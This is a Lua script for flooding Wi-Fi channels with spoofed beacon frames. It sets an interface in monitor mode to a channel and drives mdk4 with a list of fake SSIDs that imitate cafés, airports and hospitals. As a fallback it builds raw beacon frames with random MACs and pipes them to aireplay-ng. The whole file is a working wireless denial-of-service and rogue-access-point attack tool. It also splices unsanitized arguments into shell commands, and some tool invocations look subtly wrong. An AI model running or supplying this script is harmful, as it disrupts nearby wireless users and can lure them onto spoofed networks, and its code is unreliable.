#!/usr/bin/env lua

local iface = arg[1]
local channel = tonumber(arg[2]) or 1
local count = tonumber(arg[3]) or 50
local ssid_file = arg[4] or ""
local bssid_base = arg[5] or "00:11:22:33:44:55"

local function json_escape(s)
  return '"' .. tostring(s):gsub('\\', '\\\\'):gsub('"', '\\"'):gsub('\n', '\\n'):gsub('\r', '\\r') .. '"'
end

local function telemetry(event, data)
  local ts = tostring(os.time())
  io.write('{"event":' .. json_escape(event) .. ',"iface":' .. json_escape(iface) .. ',"bssid":"","ssid":"","channel":' .. tostring(channel) .. ',"data":' .. data .. ',"timestamp":' .. json_escape(ts) .. '}\n')
  io.flush()
end

local function check_monitor_mode()
  local cmd = "iw dev " .. iface .. " info 2>/dev/null"
  local f = io.popen(cmd)
  if not f then return false end
  local out = f:read("*a")
  f:close()
  if out:find("type monitor") then
    telemetry("monitor_ok", '{"message":"Monitor mode confirmed"}')
    return true
  end
  telemetry("monitor_fail", '{"message":"Interface not in monitor mode"}')
  return false
end

local function random_mac()
  local mac = ""
  math.randomseed(os.time() + math.random(1, 1000))
  for i = 1, 6 do
    local b = math.random(0, 255)
    if i == 1 then b = bit32 and bit32.bor(bit32.band(b, 0xfe), 0x02) or b end
    mac = mac .. string.format("%02x", b)
    if i < 6 then mac = mac .. ":" end
  end
  return mac
end

local function load_ssids()
  local ssids = {}
  if ssid_file ~= "" then
    local f = io.open(ssid_file, "r")
    if f then
      for line in f:lines() do
        local s = line:match("^%s*(.-)%s*$")
        if s and s ~= "" then table.insert(ssids, s) end
      end
      f:close()
    end
  end
  if #ssids == 0 then
    ssids = {"FreeWiFi", "Starbucks", "ATT_WiFi", "Xfinity", "Cafe_NET",
             "Guest", "Corporate", "IoT_Network", "5G_Hotspot", "Mesh_AP",
             "Library", "Airport", "Hotel", "Campus", "Hospital_WiFi"}
  end
  return ssids
end

local security_types = {"WPA2", "WPA3", "OPEN", "WPA2-ENT", "WPA3-ENT"}

local function build_beacon_frame(ssid, bssid, sec_type)
  local frame = string.char(0x80, 0x00, 0x00, 0x00)
  frame = frame .. string.char(0xff, 0xff, 0xff, 0xff, 0xff, 0xff)
  for b in bssid:gmatch("(%x%x)") do frame = frame .. string.char(tonumber(b, 16)) end
  for b in bssid:gmatch("(%x%x)") do frame = frame .. string.char(tonumber(b, 16)) end
  frame = frame .. string.char(0x00, 0x00)
  frame = frame .. string.char(0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)
  frame = frame .. string.char(0x64, 0x00)
  if sec_type == "OPEN" then
    frame = frame .. string.char(0x21, 0x00)
  elseif sec_type == "WPA3" then
    frame = frame .. string.char(0x31, 0x0c)
  else
    frame = frame .. string.char(0x31, 0x04)
  end
  local ssid_len = math.min(#ssid, 32)
  frame = frame .. string.char(0x00, ssid_len) .. ssid:sub(1, ssid_len)
  frame = frame .. string.char(0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24)
  frame = frame .. string.char(0x03, 0x01, channel)
  return frame
end

local function storm_mdk4(ssids)
  local ssid_list = table.concat(ssids, ",")
  local cmd = "mdk4 " .. iface .. " b -n " .. ssid_list .. " -c " .. tostring(channel) .. " -s " .. tostring(count) .. " 2>/dev/null"
  telemetry("storm_start", '{"method":"mdk4","ssid_count":' .. tostring(#ssids) .. ',"cmd":' .. json_escape(cmd) .. '}')
  local f = io.popen(cmd)
  if not f then return false end
  local sent = 0
  while true do
    local line = f:read("*l")
    if not line then break end
    if line:find("Packets") or line:find("sent") then
      sent = sent + 1
      telemetry("beacon_sent", '{"method":"mdk4","sent":' .. tostring(sent) .. '}')
    end
  end
  f:close()
  telemetry("storm_complete", '{"method":"mdk4","total_sent":' .. tostring(sent) .. '}')
  return sent > 0
end

local function storm_aireplay(ssids)
  telemetry("storm_start", '{"method":"aireplay-ng","ssid_count":' .. tostring(#ssids) .. '}')
  local tmp = "/tmp/beacon_storm_" .. iface .. ".bin"
  local f = io.open(tmp, "wb")
  if not f then return false end
  for i = 1, count do
    for _, ssid in ipairs(ssids) do
      local sec = security_types[math.random(1, #security_types)]
      local mac = random_mac()
      local frame = build_beacon_frame(ssid, mac, sec)
      f:write(frame)
    end
    if i % 5 == 0 then
      telemetry("beacon_sent", '{"method":"raw","iteration":' .. tostring(i) .. ',"total":' .. tostring(count) .. '}')
    end
  end
  f:close()
  local cmd = "cat " .. tmp .. " | aireplay-ng -D " .. iface .. " 2>/dev/null"
  os.execute(cmd)
  telemetry("storm_complete", '{"method":"aireplay-ng","total_beacons":' .. tostring(count * #ssids) .. '}')
  return true
end

if arg[1] == "--help" then
  print("Usage: beacon_storm.lua <interface> [channel] [count] [ssid_file] [bssid_base]")
  print("High-density beacon flood with random MACs and mixed security types")
  print("Example: beacon_storm.lua wlan0 1 100 /tmp/ssids.txt 00:de:ad:be:ef:00")
  os.exit(0)
end

if not iface then
  telemetry("error", '{"error":"Usage: beacon_storm.lua <interface> [channel] [count] [ssid_file]"}')
  os.exit(1)
end

if not check_monitor_mode() then
  telemetry("error", '{"error":"Monitor mode required on ' .. iface .. '"}')
  os.exit(1)
end

os.execute("iw dev " .. iface .. " set channel " .. channel .. " 2>/dev/null")
telemetry("channel_set", '{"channel":' .. tostring(channel) .. '}')

local ssids = load_ssids()

local ok = storm_mdk4(ssids)
if not ok then
  telemetry("fallback", '{"message":"mdk4 failed, trying aireplay-ng raw injection"}')
  storm_aireplay(ssids)
end

telemetry("complete", '{"ssids_used":' .. tostring(#ssids) .. '}')
